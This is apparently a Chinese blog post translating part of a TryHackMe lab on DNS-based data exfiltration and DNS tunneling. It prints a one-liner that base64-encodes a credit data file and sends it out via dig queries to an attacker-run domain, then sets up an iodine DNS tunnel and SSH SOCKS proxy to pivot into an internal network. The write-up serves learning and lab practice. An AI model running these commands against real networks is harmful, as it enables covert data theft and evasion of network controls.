<p><img src="https://i-blog.csdnimg.cn/img_convert/e69c7a9cda127adea8391f1b900e105e.png" alt="" loading="lazy"></p>
<p>att.tunnel.com由attNS.tunnel.com域名服务器来解析，而attNS.tunnel.com域名服务器又指向172.20.0.200，也就是attack机器，相当于以attack机器来解析att.tunnel.com</p>
<p>将要传输的数据base64编码，用点“.”将每 18 个字符分开</p>
<pre><code>thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&amp;./' | tr -d "\n" | sed s/$/att.tunnel.com/
</code></pre>
<ul>
<li><code>cat task9/credit.txt | base64 | tr -d "\n" | fold -w18</code>对数据进行了编码，删除了换行符，并将其分组为每行 18 个字符。</li>
<li><code>sed 's/.*/&amp;./'</code>在每行的末尾附加一个点 <code>.</code></li>
<li><code>tr -d "\n"</code>再次删除换行符</li>
<li><code>sed s/$/att.tunnel.com/</code>这将附加在行上。正则表达式与行的末尾匹配，行末尾添加att.tunnel.com</li>
</ul>
<p><img src="https://i-blog.csdnimg.cn/img_convert/1481cb864048bf38686b6eb428e06c6c.png" alt="" loading="lazy"></p>
<p>然后通过dig命令以dns形式发送被我们改造好的域名，执行 DNS 查询，即查询 DNS 名称服务器以获取域名、IP 地址和其他 DNS 相关数据的信息，通过dig ...att.tunnel.com</p>
<pre><code>thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&amp;./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
</code></pre>
<p>收到了dns请求</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/eeaea9d1ada52c960eeae69d53bafc44.png" alt="" loading="lazy"></p>
<p>解密出数据</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/0c3e522f6141a8ccb0c7c1172710e1a7.png" alt="" loading="lazy"></p>
<h3 id="dns隧道">DNS隧道</h3>
<p>iodined为服务端，iodine为客户端</p>
<p>先在攻击机搭建隧道服务端</p>
<pre><code>thm@attacker$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com 
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/img_convert/e5fcbf562c49e0fc1ebb77e7df0ee548.png" alt="" loading="lazy"></p>
<ul>
<li>确保使用 sudo 执行命令。iodined 为通过 DNS 的隧道创建新的网络接口 （dns0）。</li>
<li>-f 参数用于在前台运行服务器。</li>
<li>-c 参数用于跳过检查每个 DNS 请求的客户端 IP 地址和端口。</li>
<li>-P 参数用于设置身份验证密码。</li>
<li>10.1.1.1/24 参数用于设置新网络接口 （dns0） 的网络 IP。服务器的 IP 地址为 10.1.1.1，客户端为 10.1.1.2。</li>
<li>att.tunnel.com 是我们之前设置的名称服务器。</li>
</ul>
<p>在跳板机搭建隧道客户端</p>
<pre><code>thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com 
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/img_convert/87504ef76655a5844d4ca353ae8ce5aa.png" alt="" loading="lazy"></p>
<p>这样DNS隧道就搭建好了，通过DNS隧道连接跳板机，搭建ssh隧道，创建socks代理</p>
<pre><code>thm@attacker:~$ ssh thm@10.1.1.2 -4 -f -N -D 1080
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/img_convert/6970c0fecec60bffdf4a6d8083096167.png" alt="" loading="lazy"></p>
<p>-f 参数来强制 ssh 进入后台。-4 参数强制 ssh 客户端仅在 IPv4 上绑定。-D 开启动态端口转发，端口号为1080</p>
<p>然后使用代理访问内网资源</p>
<pre><code>thm@attacker:~$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/test.php
</code></pre>
<p><img src="https://i-blog.csdnimg.cn/img_convert/24ff769a850facc39b6e154cb1e4f651.png" alt="" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.038441487259259256" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-04-15 15:27">2025-04-15 15:27</span>&nbsp;
<a href="https://www.cnblogs.com/hu1j">Hu1j</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18826792);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18826792', targetLink: 'https://www.cnblogs.com/hu1j/p/18826792', title: 'Tryhackme部分翻译学习' })">举报</a>
</div>
        